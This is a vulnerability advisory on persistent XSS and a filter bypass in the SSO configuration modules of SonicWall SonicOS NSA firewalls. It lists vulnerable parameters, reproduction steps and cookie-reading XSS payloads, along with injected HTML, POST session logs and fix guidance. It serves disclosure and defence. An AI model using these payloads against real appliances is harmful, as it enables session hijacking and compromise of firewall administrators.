Document Title:
===============
SonicWall SonicOS NSA Web Firewall - Multiple Web Vulnerabilities


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1725


Release Date:
=============
2018-01-06


Vulnerability Laboratory ID (VL-ID):
====================================
1725


Common Vulnerability Scoring System:
====================================
4.5


Vulnerability Class:
====================
Multiple


Current Estimated Price:
========================
1.000€ - 2.000€


Product & Service Introduction:
===============================
Achieve a deeper level of security with the SonicWALL Network Security Appliance (NSA) Series of next-generation firewalls. NSA Series appliances 
integrate automated and dynamic security capabilities into a single platform, combining the patented1, SonicWALL Reassembly Free Deep Packet 
Inspection (RFDPI) firewall engine with a powerful, massively scalable, multi-core architecture. Now you can block even the most sophisticated 
threats with an intrusion prevention system (IPS) featuring advanced anti-evasion capabilities, SSL decryption and inspection, and network-based 
malware protection that leverages the power of the cloud.

(Copy of the Homepage: http://www.sonicwall.com/products/sonicwall-nsa/ )


The proven SonicOS architecture is at the core of every Dell SonicWALL firewall from the SuperMassive™ E10800 to the TZ 100. SonicOS uses deep packet 
inspection technology in combination with multi-core specialized security microprocessors to deliver application intelligence, control, and real-time 
visualization, intrusion prevention, high-speed virtual private networking (VPN) technology and other robust security features.

(Copy of the Homepage: http://www.sonicwall.com/network-security-os-platform/ )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research Team discovered multiple persistent validation vulnerabilities and a filter bypass issue in 
the official DELL SonicWall SonicOS NSA Series web-application firewall (utm) appliances.


Vulnerability Disclosure Timeline:
==================================
2018-01-06: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
DELL
Product: SonicWall UTM Firewall (NSA;MX,CLI;TZ) Series 2016 Q4


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
Multiple persistent input validation web vulnerabilities and a filter bypass issue has been discovered in the official SonicWall SoniOS NSA UTM Web-Firewall Series. 
The issue allows remote attackers and privileged user accounts to inject own malicious script codes with persistent attack vector to the affected modules to 
compromise the web-application or user session data.

The peristent exploitable validation vulnerabilities are located in the `Host Name / IP Address`, `Client Name/IP Address` and `Proxy Forward To` input fields of 
the `Users - Settings - Configure SSO` web appliance module. Remote attackers and low privileged application user accounts are able to inject own malicious script 
codes to the vulnerable input fields to compromise the `Users - Settings - Configure SSO` settings module item listing. At the end an attacker is able to save the 
information as executable content within the backend. After that the malicious context is saved to the SSO configuration module which executes the context. 
The input fields are not parsed, the context does not encode the input with a secure mechanism. The injection points are the marked input fields with the request 
method of the vulnerable modules. The execution points are located in the item listing of the separate sections. 

A filter restriction is implemented and is trying to secure the validation. The filter mechanism parses iframes with src source and other script code tags. In case 
of a mouseover onload link to a source or an img src onload with cookie alert the tags can bypass the filter validation procedure somehow and an execution of the 
context occurs.

The security risk of the peristent web vulnerabilities and filter bypass issue are estimated as medium with a cvss (common vulnerability scoring system) count of 4.5. 
Exploitation of the persistent web vulnerabilities and filter bypass issue requires a low privileged web application user account and low or medium user interaction. 
Successful exploitation of the vulnerability results in session hijacking, persistent phishing, persistent external redirects, persistent load of malicious script 
codes or persistent web module context manipulation.

Affected Request Method(s):
[+] POST

Vulnerable Module(s):
[+] Users - Settings - Configure SSO - SSO Agents 
[+] Users - Settings - Configure SSO - Terminal Services Agent Settings
[+] Users - Settings - Configure SSO - RADIUS Accounting Single-Sign-On

Vulnerable Input(s):
[+] Host Name / IP Address
[+] Client Name/IP Address
[+] Proxy Forward To

Vulnerable Parameter(s):
[+] ldapServerBindName
[+] usrTreesSel
[+] ldapUsrsTree_1
[+] svcObjId


Affected Serie(s):
[+] SonicWALL NSA 6600
[+] SonicWALL NSA 5600
[+] SonicWALL NSA 4600
[+] SonicWALL NSA 3600
[+] SonicWALL NSA 2600
[+] SonicWALL NSA 250M

Affected System(s):
[+] SonicOS (Standard or Enhanced)


Proof of Concept (PoC):
=======================
The web vulnerabilities can be exploited by remote attackers with low privileged or restricted appliance application user account with low or 
medium user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


Manual steps to reproduce the vulnerability ...
1. Open the appliance web-application firewall of sonicwall and login as restricted user or lower privileged user account
2. Surf to the Users module
3. Click to Settings and open the "SSO Configure" button
4. Open one of the vulnerable modules 
Note: Users > Settings > Configure SSO > SSO Agents; > Terminal Services Agent Settings or > RADIUS Accounting Single-Sign-On
5. Inject a script code payload to the  Host Name/IP Address(es), Client Name/IP Address & Proxy Forward To input fields
Note: Regular frames are filtered but img or iframes with alert onload or onmouseover tag do bypass the filter validation
6. Save the entry and the payload directly executes in the utm firewall web user interface
7. Successful reproduce of the application-side input validation vulnerability and filter bypass issue!


PoC Payload(s):
"><a onmouseover=alert(document.cookie)>XSS ONMOUSEOVER TEST</a>
"><img src=evil.source onerror=prompt(document.cookie);>
"><"<img onmouseover="evil.source">%20%20>"<iframe src=evil.source>%20<iframe>


PoC: Users > Settings > Configure SSO > SSO Agents > [Host Name / IP Address]
<tbody><tr class="listLabel" valign="bottom">
<td align="left" nowrap="" width="2%"><span class="objItemSpacing">#</span></td>
<td align="center" nowrap="" width="8%">Status</td>
<td align="left" nowrap="" width="30%">Host Name/IP Address  </td>
<td align="left" nowrap="" width="10%">Port  </td>
<td align="left" nowrap="" width="10%">Timeout  </td>
<td align="left" nowrap="" width="10%">Retries  </td>
<td onmouseover="onMaxRqstsMouseOver(event,this);" onmouseout="htt();" align="left" nowrap="" width="10%">
Max Rqsts
<img title="" class="ttip" src="carrot.gif" alt="" border="0"> 
</td>
<td align="center" nowrap="" width="10%">Enable</td>
<td width="10%"> </td></tr>
<tr style="cursor: pointer;" class="listItem"><td nowrap="nowrap">1</td><td align="center" nowrap="nowrap">
<img id="agentStatus-192.168.150.8  "><img src=evil.source onerror=prompt(document.cookie);>:2265" alt="" src="green_led.gif" 
border="0" height="13" width="13"></td><td style="" nowrap="">
<label style="">192.168.150.8  "><img src="evil.source" onerror="prompt(document.cookie);"></label></td><td nowrap="nowrap"><label style="">2265</label></td><td 
nowrap="nowrap"><label>10</label></td><td nowrap="nowrap"><label>6</label></td><td nowrap="nowrap"><label>32</label></td>
<td align="center" nowrap="nowrap"><input type="checkbox"></td><td align="left" nowrap="nowrap"><img 
id="agentStats-192.168.150.8  "><img src=evil.source onerror=prompt(document.cookie);>:2265" style="width: 20px; height: 
20px; border-width: 0px; padding-right: 2px;" src="stat.png"><img style="width: 20px; height: 20px; border-width: 0px; 
padding-right: 2px;" title="Edit this agent" alt="Edit this agent" src="edit.gif"><img style="width: 20px; height: 20px; 
border-width: 0px;" title="Delete this agent" alt="Delete this agent" src="trash.gif"></td></tr><tr class="" 
id="bottom-bar"><td colspan="8" align="left" nowrap="nowrap" valign="middle"><input id="add-btn" class="button" style="width: 
70px;" title="Add a new agent" value="Add..." type="button"></td><td align="left" nowrap="nowrap"><img 
style="border-width: 0px; padding-right: 2px;" id="globalStats" alt="" src="stat.png" border="0" height="20" width="20"></td></tr></tbody>


PoC: Users > Settings > Configure SSO > Terminal Services Agent Settings > [Host Name / IP Address]
<tbody><tr class="listLabel" valign="bottom">
<td align="left" nowrap="" width="2%"><span class="objItemSpacing">#</span></td>
<td align="center" nowrap="" width="8%">Active</td>
<td onmouseover="onTsaHostMouseOver(event,this);" onmouseout="htt();" align="left" nowrap="" width="50%">
Host Name/IP Address(es)  
<img title="" class="ttip" src="carrot.gif" alt="" border="0"> </td>
<td align="left" nowrap="" width="15%">Port  </td>
<td align="center" nowrap="" width="15%">Enable</td>
<td width="10%"> </td>
<td style="background-image: none; border-top-width: 0px; border-bottom-width: 0px;" class="listItem" rowspan="999" nowrap="nowrap" valign="bottom">
<div style="visibility: hidden;" id="view-scroll-div"><img src="scrollb_up.gif" id="scroll-up-img" alt=""><br><img src="scrollb_down.gif" 
id="scroll-down-img" alt=""></div></td></tr>
<tr style="cursor: pointer;" class="listItem"><td nowrap="nowrap">1</td><td align="center" nowrap="nowrap">
<img id="tsAgentStatus-0.0.0.0  "><img src=evil.source onerror=prompt(document.cookie);>:2259" alt="" src="grey_led.gif" border="0" 
height="13" width="13"></td><td nowrap=""><label style="">0.0.0.0  "><img src="evil.source" onerror="prompt(document.cookie);"></label></td>
<td nowrap="nowrap"><label>2259</label></td><td align="center" nowrap="nowrap"><input type="checkbox"></td>
<td align="left" nowrap="nowrap"><img id="tsAgentStats-0.0.0.0  "><img src=x onerror=prompt(document.cookie);>:2259" style="width: 20px; 
height: 20px; border-width: 0px; padding-right: 2px;" src="statx.png"><img style="width: 20px; height: 20px; border-width: 0px; padding-right: 
2px;" title="Edit this Terminal Services Agent" alt="Edit this Terminal Services Agent" src="edit.gif"><img style="width: 20px; height: 20px; 
border-width: 0px;" title="Delete this Terminal Services Agent" alt="Delete this Terminal Services Agent" src="trash.gif"></td></tr><tr class="" 
id="bottom-bar"><td colspan="5" align="left" nowrap="nowrap" valign="middle"><input id="add-btn" class="button" style="width: 70px;" 
title="Add a new Terminal Services Agent" value="Add..." type="button"></td><td align="left" nowrap="nowrap"><img style="border-width: 
0px; padding-right: 2px;" id="tsa_globalStats" alt="" src="stat.png" border="0" height="20" width="20"></td></tr></tbody>


PoC: Users > Settings > Configure SSO > RADIUS Accounting Single-Sign-On [Client Name/IP Address] & [Proxy Forward To] [Select In Element]
<tbody><tr class="listLabel" valign="bottom">
<td align="left" nowrap="" width="2%"><span class="objItemSpacing">#</span></td>
<td align="center" nowrap="" width="8%">Status</td>
<td align="left" nowrap="" width="25%">Client Name/IP Address </td>
<td align="left" nowrap="" width="15%">User Name Format </td>
<td align="left" nowrap="" width="35%">Proxy Forward To </td>
<td align="left" nowrap="" width="15%">Interim-Update Timeout </td>
<td width="5%"> </td>
<td style="background-image: none; border-top-width: 0px; border-bottom-width: 0px;" class="listItem" rowspan="999" nowrap="nowrap" 
valign="bottom"><div style="visibility: hidden;" id="view-scroll-div"><img src="scrollb_up.gif" id="scroll-up-img" alt=""><br><img src="scrollb_down.gif" 
id="scroll-down-img" alt=""></div></td></tr>
<tr style="cursor: pointer;" class="listItemBold"><td nowrap="nowrap">1</td><td align="center" nowrap="nowrap">
<img id="radAcctClientStatus-0.0.0.0  "><img src=evil.source onerror=prompt(document.cookie);>" alt="" src="grey_led.gif" border="0" height="13" width="13"></td>
<td nowrap=""><label style="">0.0.0.0  "><img src="evil.source" onerror="prompt(document.cookie);"></label></td><td nowrap="nowrap"><label style="">DomainUser-name</label></td>
<td style="color: rgb(255, 0, 0);" nowrap=""><label style="">0.0.0.0  "><img src="evil.source" onerror="prompt(document.cookie);">:1813</label></td><td nowrap="nowrap">
<label>Disabled</label></td><td align="right" nowrap="nowrap"><img id="radAcctClientStats-0.0.0.0  
"><img src=x onerror=prompt(document.cookie);>" style="width: 20px; height: 20px; border-width: 0px; padding-right: 2px;" src="statx.png">
<img style="width: 20px; height: 20px; border-width: 0px; padding-right: 2px;" title="Edit this radAcctClient" alt="Edit this radAcctClient" src="edit.gif">
<img style="width: 20px; height: 20px; border-width: 0px;" title="Delete this radAcctClient" alt="Delete this radAcctClient" src="trash.gif"></td></tr><tr class="" 
id="bottom-bar"><td colspan="6" align="left" nowrap="nowrap" valign="middle"><input id="add-btn" class="button" style="width: 70px;" title="Add a new radAcctClient" 
value="Add..." type="button"></td><td align="left" nowrap="nowrap"><img style="border-width: 0px; padding-right: 2px;" id="radacct_globalStats" alt="" src="stat.png" 
border="0" height="20" width="20"></td></tr></tbody>


--- PoC Session Logs [POST] ---
Status: 200[OK]
POST https://utm_waf.localhost:8512/main.cgi
Mime Type[text/html]
Request Header:
      Host[utm_waf.localhost:8512]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
	Referer[https://utm_waf.localhost:8512/ldapProps.html]
      Cookie[curUrl=usersSettingsView.html; curUsr=; tabbedWinAlert=done; 777=0; 7510=0]
      Connection[keep-alive]
POST-Daten:
      csrfToken[]
      userRadiusSelect[4]
      radiusDfltUserGroup[Domain+Users]
      cgiaction[none]
      ldapCgiAction[0]
      isLdapPost[]
      ldapServerName[192.168.113.211]
      ldapServerPort[389]
      portsSel[0]
      ldapTimeout[10]
      ldapOpnTimeout[5]
      bindType[2]
    loginName[redteam]
      loginPwd[]
      protocolSel[LDAP+version+2]
      ldapUseTls[on]
      ldapNegTls[on]
      ldapTlsRequireServerCert[on]
      tlsCertSel[new]
      ldapProtocolVer[2]
      ldapServerBindName[[MALICIOUS PAYLOAD INJECT!]]
      ldapSrvrBindNameType[1]
      ldapServerBindPwd[]
      ldapServerBindHashPwd[]
      cbox_ldapUseTls[]
      cbox_ldapNegTls[]
      cbox_ldapTlsRequireServerCert[]
      ldapTlsCertName[new]
      schemaSelect[1]
      usrQualLogonAttr[userPrincipalName]
      ldapUsrUseOtherGrpAttr[on]
      usrGrpMbrAttrTypRadio[0]
      ldapOuNameAttr[]
      ldapUsrObjClass[user]
      ldapUsrLogonNameAttr[sAMAccountName]
      ldapUsrQualLogonAttr[userPrincipalName]
      ldapUsrGrpAttr[memberOf]
      ldapUsrOtherGrpAttr[primaryGroupID]
      ldapUsrFrmdIpAttr[msRADIUSFramedIPAddress]
      ldapUsrGrpObjClass[group]
      ldapUsrGrpMbrAttr[member]
      ldapUsrGrpMbrType[0]
      ldapUsrGrpOtherMatchAttr[primaryGroupToken]
      cbox_ldapUsrUseOtherGrpAttr[]
      ldapUsrDomain[sjcolo.local]
      usrTreesSel[MALICIOUS PAYLOAD INJECT!]
      ldapTreesAutoConfDomain[]
      ldapAllowReferrals_0[on]
      ldapAllowReferrals_1[on]
      ldapAllowReferrals_2[on]
      ldapAllowReferrals_3[on]
      cbox_ldapAllowReferrals_0[]
      cbox_ldapAllowReferrals_1[]
      cbox_ldapAllowReferrals_2[]
      cbox_ldapAllowReferrals_3[]
      userRadiusCheckLocal[on]
      userRadiusUserGrpsLocal[on]
      selDfltUserGroup[2]
      ldapUsrGrpMirroring[on]
      ldapUsrGrpMirrorPeriod[x]
      ldapUsrGrpMirrorWhat[0]
      cbox_userRadiusCheckLocal[]
      cbox_userRadiusUserGrpsLocal[]
      cbox_ldapUsrGrpMirroring[]
      ldapRelayEnable[on]
      ldapRelayOnLAN[on]
      ldapRelayOnWAN[on]
      ldapRelayOnVPN[on]
      ldapRelaySecret[]
      ldapRelayLegacyVpnUsrGrp[]
      ldapRelayLegacyVpnClientGrp[]
      ldapRelayLegacyL2TPUsrGrp[]
      ldapRelayLegacyInetUsrGrp[]
      ldapRelayHashSecret[]
      cbox_ldapRelayEnable[]
      cbox_ldapRelayOnLAN[]
      cbox_ldapRelayOnWAN[]
      cbox_ldapRelayOnDMZ[]
      cbox_ldapRelayOnWLAN[]
      cbox_ldapRelayOnVPN[]
      Radius_user[]
      Radius_passwd[]
      remAuthTstProtocol[0]
      TestInfo[]
      remAuthTstType[-1]
      rNum[28F5903AD031CF055855192B2F30CC6E]
      testType[1]
      testDesc[LDAP+server]
      ldapUsrsTree_1[MALICIOUS PAYLOAD INJECT!]
   Response Header:
      Server[localhost]
    Expires[-1]
      Content-Type[text/html;charset=UTF-8]
-
Status: 200[OK]
GET https://utm_waf.localhost:8512/x[MALICIOUS PAYLOAD EXECUTION!]
Mime Type[unknown]
   Request Header:
      Host[utm_waf.localhost:8512]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[https://utm_waf.localhost:8512/ssoAuthProps.html]
      Cookie[curUrl=usersSettingsView.html; curUsr=; tabbedWinAlert=done; 777=0; 7510=0]


--- PoC Session Logs [POST] ---
Status: 200[OK]
POST https://utm_waf.localhost:8512/main.cgi
Mime Type[text/html]
   Request Header:
      Host[utm_waf.localhost:8512]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
Referer[https://utm_waf.localhost:8512/addServiceObjDlg.html]
      Cookie[curUrl=usersSettingsView.html; curUsr=; tabbedWinAlert=done; 777=2; 7510=0]
      Connection[keep-alive]
POST-Daten:
      csrfToken[]
      svcObjId_-1[MALICIOUS INJECTED PAYLOAD!]
      svcObjType_-1[1]
      svcObjProperties_-1[4878]
      svcObjIpType_-1[ssh]
      svcObjPort1_-1[1]
      svcObjPort2_-1[1]
      svcObjManagement_-1[0]
      svcObjHigherPrecedence_-1[0]
Response Header:
      Server[localhost]
      Content-Type[text/html;charset=UTF-8]
-
Status: 200[OK]
GET https://utm_waf.localhost:8512/x[MALICIOUS PAYLOAD EXECUTION!]
Mime Type[text/html]
   Request Header:
      Host[utm_waf.localhost:8512]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0]
      Referer[https://utm_waf.sonicwall:8512/ssoAuthProps.html]
      Cookie[curUrl=usersSettingsView.html; curUsr=; tabbedWinAlert=done; 777=3; 7510=0]
      Connection[keep-alive]
Response Header:
      Server[SonicWALL]
      Content-Type[text/html;charset=UTF-8]


Reference(s):
https://utm_waf.sonicwall:8512/
https://utm_waf.localhost:8512/main.cgi
https://utm_waf.localhost:8512/ldapProps.html
https://utm_waf.sonicwall:8512/ssoAuthProps.html
https://utm_waf.localhost:8512/addServiceObjDlg.html


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a parse and encode of the vulnerable `Host Name / IP Address`, `Client Name/IP Address` and 
`Proxy Forward To` input fields. Encode the following values `ldapServerBindName - usrTreesSel - ldapUsrsTree_1` and `svcObjId` 
to prevent an inject via POST method. Restrict the input fields and disallow the usage of special chars. Encode in the last step 
the output listing locations in the `SSO Agents `,`Terminal Services Agent Settings` and `RADIUS Accounting Single-Sign-On` 
modules to prevent the execution points of the vulnerabilities. Adjust the filter procedure and setup a more seure 
exception-handling to interact during an invalid execution or unhandled exception.

Note: All the security issues are marked as resolved by dell sonicwall with several updates until 2017 Q4.


Security Risk:
==============
The security risk of the application-side input validation web vulnerability and the filter bypass issue are estimated as medium. (CVSS 4.5)


Credits & Authors:
==================
Benjamin K.M. [bkm@vulnerability-lab.com] - https://www.vulnerability-lab.com/show.php?user=Benjamin+K.M.


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
phone numbers, conversations or anything else to journalists, investigative authorities or private individuals.